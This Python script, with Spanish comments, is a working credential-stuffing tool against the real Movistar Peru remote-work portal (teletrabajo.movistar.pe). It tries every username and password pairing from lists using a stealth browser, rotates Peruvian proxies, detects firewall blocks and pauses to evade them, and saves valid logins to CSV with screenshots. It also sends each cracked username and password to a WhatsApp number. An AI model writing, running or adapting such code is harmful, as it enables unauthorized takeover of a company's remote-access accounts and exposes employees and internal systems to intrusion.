"""
Validador Teletrabajo Movistar (probarteletrabajo.py)
=====================================================
Módulo para validación masiva de credenciales en el portal:
https://teletrabajo.movistar.pe

Características:
- Integración con proxy_config.py (Proxies rotativos de Perú o IP Local).
- Soporte Multi-hilo (configuración de hilos concurrentes).
- Modo Headless / Visual configurable.
- Detección de errores críticos (2 WAFs seguidos, 2 páginas en blanco, 2 timeouts).
- Persistencia de checkpoints con state_manager.py para reanudar.
- Notificaciones completas vía whatsapp_notifier.py.
"""

import os
import sys
import csv
import time
import json
import logging
import threading
from pathlib import Path
from datetime import datetime
from typing import List, Dict, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

# Agregar la raíz del proyecto al sys.path
PROJECT_DIR = Path(__file__).parent
sys.path.insert(0, str(PROJECT_DIR))

# Importar configuración de proxy centralizada
from proxy_config import SUPERPROXY_CONFIG, get_proxy_config, generate_session_id

# Importar notificaciones de WhatsApp
from whatsapp_notifier import (
    notificar_login_exitoso,
    notificar_resumen,
    notificar_error_critico,
    esta_configurado,
    obtener_numero_destino
)


# Importar gestor de estado y checkpoints
from state_manager import guardar_checkpoint, limpiar_checkpoint

# Motor de Navegador Stealth (Patchright / Playwright)
try:
    from patchright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
    HAS_BROWSER = True
except ImportError:
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
        HAS_BROWSER = True
    except ImportError:
        HAS_BROWSER = False

# ============================================================
# RUTAS Y ARCHIVOS
# ============================================================
DATA_DIR = PROJECT_DIR / "data"
PROBADOR_DIR = PROJECT_DIR / "probador"
SCREENSHOTS_DIR = PROJECT_DIR / "screenshots" / "teletrabajo"
LOGS_DIR = PROJECT_DIR / "logs"

SCREENSHOTS_DIR.mkdir(parents=True, exist_ok=True)
LOGS_DIR.mkdir(parents=True, exist_ok=True)
DATA_DIR.mkdir(parents=True, exist_ok=True)

CSV_EXITOSOS = DATA_DIR / "teletrabajo_exitosos.csv"
CSV_INCORRECTOS = DATA_DIR / "teletrabajo_incorrectos.csv"

# Configuración de Logging
log_file = LOGS_DIR / f"teletrabajo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)-5s] [%(threadName)-12s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(str(log_file), encoding="utf-8")
    ]
)
logger = logging.getLogger("Teletrabajo")

# ============================================================
# PARÁMETROS DEL PORTAL TELETRABAJO
# ============================================================
TELETRABAJO_URL = "https://teletrabajo.movistar.pe"

XPATHS = {
    "login_input": '//*[@id="login"]',
    "passwd_input": '//*[@id="passwd"]',
    "btn_logon": '//*[@id="nsg-x1-logon-button"]',
    "error_msg": '//*[@id="explicit-auth-screen"]/div[3]/div/div[2]/div[2]/div[3]/div[1]/form/div[6]/div/p/span',
}

WAF_INDICATORS = [
    "418", "intercepted because it appears to be an attack",
    "request has been intercepted", "waf console", "event id:",
    "web application firewall", "blocked by waf", "access denied",
    "request blocked", "your request has been blocked",
    "cloudwaf", "blocked by cloudwaf", "forbidden", "403 forbidden"
]

# Locks y Contadores Globales
_print_lock = threading.Lock()
_file_lock = threading.Lock()
_stats_lock = threading.Lock()
stats = {"total": 0, "exitosos": 0, "incorrectos": 0, "errores": 0, "waf": 0}
usuarios_exitosos = set()


def sp(msg: str):
    """Impresión segura en consola compartida entre hilos."""
    with _print_lock:
        print(msg, flush=True)


def cargar_usuarios_y_claves() -> Tuple[List[str], List[str]]:
    """
    Carga listas de usuarios y contraseñas buscando en data/ y probador/.
    Si no existen, los crea automáticamente con plantilla por defecto.
    """
    usuarios = []
    contrasenas = []

    # Buscar usuarios
    archivos_usuarios = [
        DATA_DIR / "usuarios.csv",
        PROBADOR_DIR / "credenciales.csv",
        PROJECT_DIR / "usuarios.csv"
    ]
    for p in archivos_usuarios:
        if p.exists():
            with open(p, "r", encoding="utf-8-sig") as f:
                for line in f:
                    u = line.strip()
                    if u and not u.startswith("#") and u.lower() != "usuario":
                        usuarios.append(u)
            if usuarios:
                logger.info(f"Usuarios cargados desde {p.name}: {len(usuarios)}")
                break

    if not usuarios:
        DATA_DIR.mkdir(parents=True, exist_ok=True)
        default_user_file = DATA_DIR / "usuarios.csv"
        if not default_user_file.exists():
            with open(default_user_file, "w", encoding="utf-8") as f:
                f.write("# Ingrese los usuarios (uno por línea)\n")
            logger.warning(f"⚠️ Archivo no encontrado. Se auto-generó {default_user_file}")

    # Buscar contraseñas
    archivos_claves = [
        DATA_DIR / "contraseñas.csv",
        PROBADOR_DIR / "contraseña.csv",
        PROJECT_DIR / "contraseñas.csv"
    ]
    for p in archivos_claves:
        if p.exists():
            with open(p, "r", encoding="utf-8-sig") as f:
                for line in f:
                    c = line.strip()
                    if c and not c.startswith("#") and c.lower() != "password":
                        contrasenas.append(c)
            if contrasenas:
                logger.info(f"Contraseñas cargadas desde {p.name}: {len(contrasenas)}")
                break

    if not contrasenas:
        DATA_DIR.mkdir(parents=True, exist_ok=True)
        default_pass_file = DATA_DIR / "contraseñas.csv"
        if not default_pass_file.exists():
            with open(default_pass_file, "w", encoding="utf-8") as f:
                f.write("# Ingrese las contraseñas (una por línea)\n")
            logger.warning(f"⚠️ Archivo no encontrado. Se auto-generó {default_pass_file}")

    usuarios = list(dict.fromkeys(usuarios))
    contrasenas = list(dict.fromkeys(contrasenas))
    return usuarios, contrasenas


def guardar_resultado(usuario: str, contrasena: str, resultado: str, detalle: str = "", ip_info: str = ""):
    """Guarda resultados en archivos CSV auto-creando directorios y archivos si no existen."""
    with _file_lock:
        fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if resultado == "EXITOSO":
            target_csv = CSV_EXITOSOS
            alt_csv = PROBADOR_DIR / "loginexitoso.csv"
        else:
            target_csv = CSV_INCORRECTOS
            alt_csv = PROBADOR_DIR / "loginincorrecto.csv"

        for filepath in [target_csv, alt_csv]:
            try:
                filepath.parent.mkdir(parents=True, exist_ok=True)
                existe = filepath.exists()
                with open(filepath, "a", encoding="utf-8", newline="") as f:
                    writer = csv.writer(f)
                    if not existe:
                        writer.writerow(["fecha", "usuario", "password", "resultado", "ip", "detalle"])
                    writer.writerow([fecha, usuario, contrasena, resultado, ip_info, detalle])
            except Exception as e:
                logger.error(f"Error escribiendo a {filepath}: {e}")


def validar_login_teletrabajo(
    usuario: str,
    contrasena: str,
    proxy_cfg: Optional[Dict],
    headless: bool = True,
    timeout_ms: int = 35000
) -> Dict:
    """
    Realiza un intento de login en https://teletrabajo.movistar.pe
    utilizando Patchright con/sin proxy.
    """
    result = {
        "usuario": usuario,
        "contrasena": contrasena,
        "resultado": "ERROR",  # "EXITOSO", "INCORRECTO", "WAF", "ERROR"
        "is_blank": False,
        "is_timeout": False,
        "detalle": "",
        "screenshot": "",
        "ip": proxy_cfg["ip"] if proxy_cfg else "Local",
    }

    if not HAS_BROWSER:
        result["detalle"] = "Playwright/Patchright no está disponible"
        return result

    playwright = None
    browser = None
    context = None
    page = None

    try:
        playwright = sync_playwright().start()

        launch_opts = {
            "headless": headless,
            "args": [
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-infobars",
                "--start-maximized"
            ]
        }

        if proxy_cfg:
            launch_opts["proxy"] = {
                "server": f"http://{proxy_cfg['host']}:{proxy_cfg['port']}",
                "username": proxy_cfg["username"],
                "password": proxy_cfg["password"],
            }

        try:
            browser = playwright.chromium.launch(channel="chrome", **launch_opts)
        except Exception:
            browser = playwright.chromium.launch(**launch_opts)

        context = browser.new_context(
            viewport={"width": 1366, "height": 768},
            locale="es-PE",
            timezone_id="America/Lima"
        )
        page = context.new_page()

        # 1. Navegar a teletrabajo
        try:
            page.goto(TELETRABAJO_URL, wait_until="domcontentloaded", timeout=timeout_ms)
        except PlaywrightTimeout:
            result["resultado"] = "ERROR"
            result["is_timeout"] = True
            result["detalle"] = f"Timeout ({timeout_ms/1000:.0f}s) cargando {TELETRABAJO_URL}"
            return result
        except Exception as e:
            err_msg = str(e)
            result["resultado"] = "ERROR"
            result["detalle"] = f"Error al navegar: {err_msg[:80]}"
            if "timeout" in err_msg.lower():
                result["is_timeout"] = True
            if "blank" in err_msg.lower() or "chrome-error" in err_msg.lower():
                result["is_blank"] = True
            return result

        time.sleep(1.5)

        # 2. Detección WAF
        body_text = (page.text_content("body") or "").lower()
        page_title = (page.title() or "").lower()

        for ind in WAF_INDICATORS:
            if ind.lower() in body_text or ind.lower() in page_title:
                result["resultado"] = "WAF"
                result["detalle"] = f"Bloqueo WAF detectado ('{ind}')"
                return result

        # Detección de página en blanco
        if "chrome-error://" in page.url or page.url == "about:blank" or len(body_text.strip()) < 20:
            result["resultado"] = "ERROR"
            result["is_blank"] = True
            result["detalle"] = "Página en blanco / Fallo de carga"
            return result

        # 3. Ingresar Usuario
        try:
            page.wait_for_selector(f"xpath={XPATHS['login_input']}", timeout=15000)
            page.fill(f"xpath={XPATHS['login_input']}", usuario)
        except PlaywrightTimeout:
            result["resultado"] = "ERROR"
            result["is_timeout"] = True
            result["detalle"] = "No se encontró el campo de usuario (Timeout)"
            return result

        # 4. Ingresar Contraseña
        try:
            page.wait_for_selector(f"xpath={XPATHS['passwd_input']}", timeout=10000)
            page.fill(f"xpath={XPATHS['passwd_input']}", contrasena)
        except PlaywrightTimeout:
            result["resultado"] = "ERROR"
            result["is_timeout"] = True
            result["detalle"] = "No se encontró el campo de contraseña (Timeout)"
            return result

        # 5. Clic en Botón Logon
        btn = page.locator(f"xpath={XPATHS['btn_logon']}")
        btn.click()

        # 6. Esperar y Evaluar Respuesta
        start_wait = time.time()
        while time.time() - start_wait < 20:
            time.sleep(1)
            curr_url = page.url

            # Revisar si apareció mensaje de error de credenciales
            try:
                err_elem = page.locator(f"xpath={XPATHS['error_msg']}")
                if err_elem.is_visible():
                    err_txt = (err_elem.text_content() or "").strip()
                    result["resultado"] = "INCORRECTO"
                    result["detalle"] = err_txt or "Credenciales inválidas"
                    return result
            except:
                pass

            body_now = (page.text_content("body") or "").lower()
            if "incorrecta" in body_now or "usuario no encontrado" in body_now or "invalid credentials" in body_now:
                result["resultado"] = "INCORRECTO"
                result["detalle"] = "Mensaje de contraseña/usuario incorrecto"
                return result

            # Revisar si se redirigió al portal interno / dashboard
            if curr_url != TELETRABAJO_URL and "login" not in curr_url.lower() and "vpn" in curr_url.lower():
                result["resultado"] = "EXITOSO"
                result["detalle"] = f"Redirección exitosa: {curr_url[:60]}"
                break
            
            if "cerrar sesión" in body_now or "logout" in body_now:
                result["resultado"] = "EXITOSO"
                result["detalle"] = "Sesión iniciada correctamente"
                break

        if result["resultado"] == "EXITOSO":
            shot_file = SCREENSHOTS_DIR / f"exito_{usuario}_{int(time.time())}.png"
            try:
                shot_file.parent.mkdir(parents=True, exist_ok=True)
                page.screenshot(path=str(shot_file))
                result["screenshot"] = str(shot_file)
            except:
                pass
        elif result["resultado"] == "ERROR":
            if "login" in page.url.lower() or page.url == TELETRABAJO_URL:
                result["resultado"] = "INCORRECTO"
                result["detalle"] = "Permaneció en pantalla de login tras enviar datos"

    except Exception as e:
        err_msg = str(e)
        result["resultado"] = "ERROR"
        result["detalle"] = f"Excepción en login: {err_msg[:100]}"
        if "timeout" in err_msg.lower():
            result["is_timeout"] = True
        if "blank" in err_msg.lower() or "chrome-error" in err_msg.lower():
            result["is_blank"] = True
    finally:
        try:
            if page: page.close()
            if context: context.close()
            if browser: browser.close()
            if playwright: playwright.stop()
        except:
            pass

    return result


def worker_tarea(task: Dict, proxy_cfg: Optional[Dict], headless: bool, usar_whatsapp: bool = True) -> Dict:
    """Worker que ejecuta un intento de login y actualiza estadísticas."""
    usuario = task["u"]
    contrasena = task["p"]

    res = validar_login_teletrabajo(
        usuario=usuario,
        contrasena=contrasena,
        proxy_cfg=proxy_cfg,
        headless=headless
    )

    guardar_resultado(
        usuario=usuario,
        contrasena=contrasena,
        resultado=res["resultado"],
        detalle=res["detalle"],
        ip_info=res["ip"]
    )

    with _stats_lock:
        stats["total"] += 1
        if res["resultado"] == "EXITOSO":
            stats["exitosos"] += 1
            usuarios_exitosos.add(usuario)
            # Enviar notificación WhatsApp en segundo plano
            if usar_whatsapp and esta_configurado():
                sp(f"  📲 Enviando alerta instantánea por WhatsApp (+{obtener_numero_destino()})...")
                threading.Thread(
                    target=notificar_login_exitoso,
                    kwargs={
                        "usuario": usuario,
                        "contrasena": contrasena,
                        "portal": "Teletrabajo Movistar",
                        "procedencia": "N/A",
                        "ip": res.get("ip", "N/A"),
                        "screenshot_path": res.get("screenshot")
                    },
                    daemon=True
                ).start()
        elif res["resultado"] == "INCORRECTO":
            stats["incorrectos"] += 1
        elif res["resultado"] == "WAF":
            stats["waf"] += 1
        else:
            stats["errores"] += 1

    return res


def main(checkpoint_data=None):
    print("""
============================================================
  🚀 VALIDADOR TELETRABAJO MOVISTAR (probarteletrabajo.py)
  Portal: https://teletrabajo.movistar.pe
============================================================
    """)

    # 1. Cargar Usuarios y Contraseñas
    if checkpoint_data:
        print(f"🔄 Reanudando sesión guardada desde tarea {checkpoint_data.get('task_idx', 0)}/{checkpoint_data.get('total_tasks', 0)}...")
        all_tasks = checkpoint_data.get("all_tasks", [])
        task_idx = checkpoint_data.get("task_idx", 0)
        saved_cfg = checkpoint_data.get("config", {})
        usar_proxy = saved_cfg.get("usar_proxy", True)
        num_threads = saved_cfg.get("num_threads", 5)
        headless = saved_cfg.get("headless", True)
        tiempo_espera_s = saved_cfg.get("tiempo_espera_s", 0)
        usar_whatsapp = saved_cfg.get("usar_whatsapp", esta_configurado())
        if "stats" in checkpoint_data:
            stats.update(checkpoint_data["stats"])
    else:
        usuarios, contrasenas = cargar_usuarios_y_claves()
        if not usuarios or not contrasenas:
            print("❌ No se encontraron usuarios o contraseñas en data/ o probador/.")
            sys.exit(1)

        all_tasks = []
        for c in contrasenas:
            for u in usuarios:
                all_tasks.append({"u": u, "p": c})

        task_idx = 0
        print(f"  Total Usuarios:     {len(usuarios):,}")
        print(f"  Total Contraseñas:  {len(contrasenas):,}")
        print(f"  Total Tareas:       {len(all_tasks):,}")

        # 2. Configurar Proxy
        pr = input("\n¿Desea utilizar proxy? (s/n, default=s): ").strip().lower()
        usar_proxy = pr != "n"
        print(f"  Usar proxy: {'SI' if usar_proxy else 'NO (IP Local)'}")

        # 3. Configurar Hilos
        th = input("\n¿Cuántos hilos / navegadores simultáneos? (default=5): ").strip()
        num_threads = int(th) if th.isdigit() and int(th) > 0 else 5
        num_threads = min(num_threads, 50)
        print(f"  Hilos simultáneos: {num_threads}")

        # 4. Configurar Headless
        hl = input("\n¿Headless? (s/n, default=s): ").strip().lower()
        headless = hl != "n"
        print(f"  Modo Headless: {headless}")

        # 5. Configurar Tiempo de Espera
        try:
            wt = input("\n¿Minutos de espera entre rondas de contraseñas? [0-15, default=0]: ").strip()
            tiempo_espera_s = int(wt) * 60 if wt.isdigit() else 0
        except:
            tiempo_espera_s = 0
        print(f"  Espera entre rondas: {tiempo_espera_s}s")

        # 6. Configurar WhatsApp
        if esta_configurado():
            wa_in = input(f"\n¿Desea activar notificaciones por WhatsApp a +{obtener_numero_destino()}? (s/n, default=s): ").strip().lower()
            usar_whatsapp = wa_in != "n"
        else:
            wa_in = input("\nWhatsApp no configurado. ¿Desea configurarlo ahora? (s/n, default=n): ").strip().lower()
            if wa_in == "s":
                import configurarwhatsapp
                configurarwhatsapp.configurar_whatsapp()
                usar_whatsapp = esta_configurado()
            else:
                usar_whatsapp = False
        print(f"  WhatsApp: {'ACTIVO (+'+str(obtener_numero_destino())+')' if (usar_whatsapp and esta_configurado()) else 'DESACTIVADO'}")

    # Confirmar Inicio
    print("\n" + "="*60)
    print("📋 RESUMEN DE CONFIGURACIÓN")
    print(f"  • Objetivo:   {TELETRABAJO_URL}")
    print(f"  • Proxy:      {'SUPERPROXY (Perú Rotativo)' if usar_proxy else 'IP Local'}")
    print(f"  • Hilos:      {num_threads}")
    print(f"  • Headless:   {headless}")
    print(f"  • WhatsApp:   {'ACTIVO (+'+str(obtener_numero_destino())+')' if (usar_whatsapp and esta_configurado()) else 'DESACTIVADO'}")
    print(f"  • Pendientes: {len(all_tasks) - task_idx} tareas")
    print("="*60)


    if not checkpoint_data and input("\n¿Iniciar validación? (s/n, default=s): ").strip().lower() == "n":
        print("Operación cancelada.")
        sys.exit(0)

    start_time = datetime.now()
    batch_num = 0
    consecutive_waf_count = 0
    consecutive_blank_count = 0
    consecutive_timeout_count = 0

    print(f"\n{'*'*60} INICIANDO EJECUCIÓN {'*'*60}")

    try:
        while task_idx < len(all_tasks):
            # Filtrar tareas cuyos usuarios ya fueron validados con éxito
            batch_tasks = []
            while task_idx < len(all_tasks) and len(batch_tasks) < num_threads:
                t = all_tasks[task_idx]
                task_idx += 1
                if t["u"] not in usuarios_exitosos:
                    batch_tasks.append(t)

            if not batch_tasks:
                if task_idx >= len(all_tasks):
                    break
                continue

            batch_num += 1

            if usar_proxy:
                proxy_cfg = get_proxy_config()
                sp(f"\n🔄 Batch #{batch_num} | IP Proxy: {proxy_cfg['ip']} ({len(batch_tasks)} tareas)")
            else:
                proxy_cfg = None
                sp(f"\n🔄 Batch #{batch_num} | IP Local ({len(batch_tasks)} tareas)")

            batch_results = []
            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                futures = [executor.submit(worker_tarea, task, proxy_cfg, headless, usar_whatsapp) for task in batch_tasks]
                for future in as_completed(futures):

                    try:
                        r = future.result()
                        batch_results.append(r)
                        icon = "✅" if r["resultado"] == "EXITOSO" else ("🚫" if r["resultado"] == "WAF" else "❌")
                        sp(f"  {icon} [{r['resultado']}] {r['usuario']} -> {r['detalle']}")
                    except Exception as e:
                        sp(f"  ⚠️ Error en hilo: {e}")

            # Evaluar errores críticos en el batch
            batch_wafs = sum(1 for r in batch_results if r.get("resultado") == "WAF")
            batch_blanks = sum(1 for r in batch_results if r.get("is_blank"))
            batch_timeouts = sum(1 for r in batch_results if r.get("is_timeout"))

            consecutive_waf_count = (consecutive_waf_count + batch_wafs) if batch_wafs > 0 else 0
            consecutive_blank_count = (consecutive_blank_count + batch_blanks) if batch_blanks > 0 else 0
            consecutive_timeout_count = (consecutive_timeout_count + batch_timeouts) if batch_timeouts > 0 else 0

            # ============================================================
            # DETECCIÓN DE ERRORES CRÍTICOS (2 OCURRENCIAS SEGUIDAS)
            # ============================================================
            error_critico_motivo = None
            error_critico_detalle = None

            if consecutive_waf_count >= 2:
                error_critico_motivo = "2 Bloqueos WAF Consecutivos"
                error_critico_detalle = f"Se detectaron {consecutive_waf_count} bloqueos WAF en pruebas sucesivas."
            elif consecutive_blank_count >= 2:
                error_critico_motivo = "2 Pantallas en Blanco Consecutivas"
                error_critico_detalle = f"La página de Teletrabajo quedó en blanco en {consecutive_blank_count} intentos consecutivos."
            elif consecutive_timeout_count >= 2:
                error_critico_motivo = "2 Demoras Excesivas / Timeouts Consecutivos"
                error_critico_detalle = f"Se registraron {consecutive_timeout_count} timeouts seguidos al cargar la página."

            if error_critico_motivo:
                sp(f"\n🚨 ERROR CRÍTICO DETECTADO: {error_critico_motivo}")
                sp(f"   Detalle: {error_critico_detalle}")
                sp("💾 Guardando checkpoint del estado actual y pausando ejecución...")

                ultimo_fallo = batch_results[-1] if batch_results else None

                if esta_configurado():
                    notificar_error_critico(
                        portal="Teletrabajo Movistar",
                        motivo=error_critico_motivo,
                        detalle=error_critico_detalle,
                        tarea_actual=ultimo_fallo,
                        tareas_restantes=len(all_tasks) - task_idx
                    )

                guardar_checkpoint(
                    portal="Teletrabajo Movistar",
                    script="probarteletrabajo.py",
                    task_idx=task_idx,
                    all_tasks=all_tasks,
                    stats=stats,
                    config={
                        "num_threads": num_threads,
                        "usar_proxy": usar_proxy,
                        "headless": headless,
                        "tiempo_espera_s": tiempo_espera_s
                    },
                    motivo=error_critico_motivo,
                    ultimo_error=error_critico_detalle
                )

                sp("\n⏸️ EJECUCIÓN PAUSADA. Puede reanudarla ejecutando: python ejecutar.py\n")
                return

            time.sleep(1)

    except KeyboardInterrupt:
        sp("\n⏹️ Interrumpido por el usuario. Guardando estado...")
        guardar_checkpoint(
            portal="Teletrabajo Movistar",
            script="probarteletrabajo.py",
            task_idx=task_idx,
            all_tasks=all_tasks,
            stats=stats,
            config={
                "num_threads": num_threads,
                "usar_proxy": usar_proxy,
                "headless": headless,
                "tiempo_espera_s": tiempo_espera_s
            },
            motivo="Interrupción manual del usuario",
            ultimo_error=""
        )
        return
    except Exception as e:
        logger.error(f"Error fatal: {e}", exc_info=True)
        guardar_checkpoint(
            portal="Teletrabajo Movistar",
            script="probarteletrabajo.py",
            task_idx=task_idx,
            all_tasks=all_tasks,
            stats=stats,
            config={
                "num_threads": num_threads,
                "usar_proxy": usar_proxy,
                "headless": headless,
                "tiempo_espera_s": tiempo_espera_s
            },
            motivo=f"Excepción: {str(e)[:100]}",
            ultimo_error=str(e)
        )
        return

    # Limpiar checkpoint al completar
    limpiar_checkpoint()

    # Resumen final
    duracion = str(datetime.now() - start_time).split(".")[0]
    print("\n" + "="*60)
    print("📊 RESUMEN FINAL TELETRABAJO")
    print("="*60)
    print(f"  Total Pruebas:   {stats['total']}")
    print(f"  ✅ Exitosos:     {stats['exitosos']}")
    print(f"  ❌ Incorrectos:  {stats['incorrectos']}")
    print(f"  🚫 WAF Bloqueos: {stats['waf']}")
    print(f"  ⚠️ Errores:      {stats['errores']}")
    print(f"  ⏱️ Duración:     {duracion}")
    print(f"  📁 Exitosos CSV: {CSV_EXITOSOS}")
    print(f"  📁 Logs:         {log_file}")
    print("="*60)

    if usar_whatsapp and esta_configurado():
        notificar_resumen(
            total=stats["total"],
            exitosos=stats["exitosos"],
            fallidos=stats["incorrectos"] + stats["errores"],
            duracion=duracion,
            portal="Teletrabajo Movistar"
        )
        sp("📲 Resumen enviado por WhatsApp.")


    print("✅ Proceso completado exitosamente.\n")


if __name__ == "__main__":
    main()
